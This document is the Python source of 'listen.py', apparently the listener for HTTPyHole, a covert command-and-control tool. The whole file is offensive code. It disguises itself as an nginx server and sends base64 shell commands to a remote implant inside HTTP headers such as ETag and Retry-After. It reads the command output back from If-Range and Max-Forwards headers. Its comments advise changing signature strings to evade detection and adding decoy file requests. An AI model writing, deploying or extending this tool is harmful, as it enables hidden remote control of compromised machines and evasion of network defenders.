#/usr/bin/env python

#
# listen.py -- HTTPyHole listener
# Author: pasv (pasvninja [at] gmail [d0t] com
# 

# This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

import getopt
import BaseHTTPServer
import base64
import sys
import os

# These can be changed but must match your shell,
BLOCK_SIZE = 32
INIT_CONNECTION_STRING = "737060cd8c284d8af7ad3082f209582d" # change this or randomize it if you find yourself being sig'd
CONT_CONNECTION_STRING = "227061cd8c2a4d8af7ab2132f203453a"
FINI_CONNECTION_STRING = "143061cdac2a4d8ff7ad213432cd413a"

DEBUG=False
PORT = 80
SERVER_VERSION="nginx/0.7.67"
VERSION="HTTPyHole Listener v0.1"
WAIT_TIME = 0  # TODO: negotiate between shell and listener a wait time between http requests..

payloads_to_open = []
payloads = []
batch_cmds = []

def usage(path):
    print "Usage:"
    print path + " [-v] [-c file] [-d]" #TODO update this
    print "\t-v\t\t--version"
    print "\t-p\t\t--port port"
    print "\t-d\t\t--debug"
    print "\t-w\t\t--wait time(float)"
    print "\t-e\t\t--execute \"command\""
    print "\t-b\t\t--batch-execute file.bat"
    print "\t-f\t\t--file payload1.gif,payload2.txt,playload3.pdf"
    print "\t-h\t\t--help"
    print "NOTE: It is highly advisable to use the -f option, otherwise blank HTTP responses from listener!"
    sys.exit(-1)

def load_batch_commands(filename):
    try:
        fh = open(filename)
        batch_cmds.extend(fh.readlines())
    except:
        print "couldn't read batch file"

def load_payloads(files):
    for payload in files:
        try:
            fh = open(payload)
            payloads.append(fh.read()) # consider revise
        except:
            print "Couldn't open " + payload

def parse_args(argv):
    try:
        options, therest = getopt.getopt(argv[1:], 'w:e:p:f:b:dvh', ['wait=', 'execute=',  'port=', 'file=', 'batch-execute=', 'debug', 'version', 'help'])
    
        for opt, arg in options:
            if opt in ('-p', '--port'):
                PORT = int(arg)
            elif opt in ('-e', '--execute'):
                batch_cmds.append(arg)
            elif opt in ('-b', '--batch-execute'):
                load_batch_commands(arg)
            elif opt in ('-d', '--debug'):
                DEBUG = True
            elif opt in ('-w', '--wait'):
                WAIT_TIME = int(arg)
            elif opt in ('-v', '--version'):
                print VERSION
                sys.exit(0)
            elif opt in ('-f', '--file'):
                payloads_to_open=arg.split(',')
                load_payloads(payloads_to_open)
            elif opt in ('-h', '--help'):
                usage(argv[0])
    except getopt.GetoptError:
        usage(argv[0])

class placeholder():
    def init(self):
        self.send_size=0
        self.send_count=0
        self.send_blocks = []
        self.response_blocks = []
        self.response_count = 0

w=placeholder()

## Here we take the URL that's being accessed and read its probable file type
# then we pair it with a response from one of our files.
def do_FAKE_RESPONSE(http):
    return ""

def handle_cmd(http):
    if(batch_cmds.__len__() == 0):
        cmd = raw_input("$:")
    else:
        cmd = batch_cmds.pop(0)
    w.send_count = 0
    print "Sending command: " + cmd
    cmd = base64.b64encode(cmd)
    w.send_size = len(cmd) / BLOCK_SIZE
    if(len(cmd) % BLOCK_SIZE != 0):
        w.send_size = w.send_size + 1
    http.send_header("Retry-After", w.send_size+50 ) # this determines how many chunks we have to send to send the command..
    w.response_count = 0
    # split up the send blocks
    w.send_blocks = []
    w.response_blocks = []
    i=0
    j=0
    for c in list(cmd):
        w.send_blocks.append("")
        if((i % BLOCK_SIZE) == 0 and i != 0):
            j += 1
        w.send_blocks[j] += c 
        i += 1
    http.end_headers()
    http.wfile.write(do_FAKE_RESPONSE(http))

def handle_response(http):
    print "Max-Forwards:" + http.headers.getheader("Max-Forwards")
    if(int(http.headers.getheader("Max-Forwards"))-10 != 0):
        w.response_blocks.append("")
        w.response_blocks[w.response_count] = str(http.headers.getheader("If-Range"))
        w.response_count += 1
    else: # when Max-Forwards is = 10 the transmission is over, piece together the blocks and show output
            response = ""
            for chunks in w.response_blocks:
                response = response + chunks
            response = base64.b64decode(response)
            print response
            w.response_count=0


class HTTPHandler (BaseHTTPServer.BaseHTTPRequestHandler):
    # later we will parse the end of each URL request GET /images/goat.[gif] for the file type and repond accordingly, no shell data included
    def do_GET(self):  #url completely ignored, insert random GETs of various resources for your shell, CSS, js, gif, jpg, html files doesnt matter
        self.server_version = SERVER_VERSION
        self.sys_version = ""
        self.send_response(200)
        if(self.headers.getheader("If-None-Match") == INIT_CONNECTION_STRING):
            handle_cmd(self)
        if(self.headers.getheader("If-None-Match") == CONT_CONNECTION_STRING):
            # set the w.send_count-1 and update Retry-After accordingly for shell
            if(w.send_size > w.send_count):
                #self.send_header("Retry-After", (w.send_size-w.send_count+50))
                self.send_header("ETag", w.send_blocks[w.send_count]) #change this, even randomize it if you can establish an ordering with your shell.. :)
                w.send_count += 1
              
        # consider using a different header, might be effected by proxies
        if(self.headers.getheader("Max-Forwards")):
            handle_response(self)
        
        self.end_headers()
        self.wfile.write(do_FAKE_RESPONSE(self)) # take GET's filetype request, match it to a file and plug it in

if __name__ == "__main__":
    parse_args(sys.argv)
    svr = BaseHTTPServer.HTTPServer(('', PORT), HTTPHandler) # wait for pwn
    try:
        svr.serve_forever()
    except KeyboardInterrupt:
        print "[!]Ctrl^c caught: exiting."

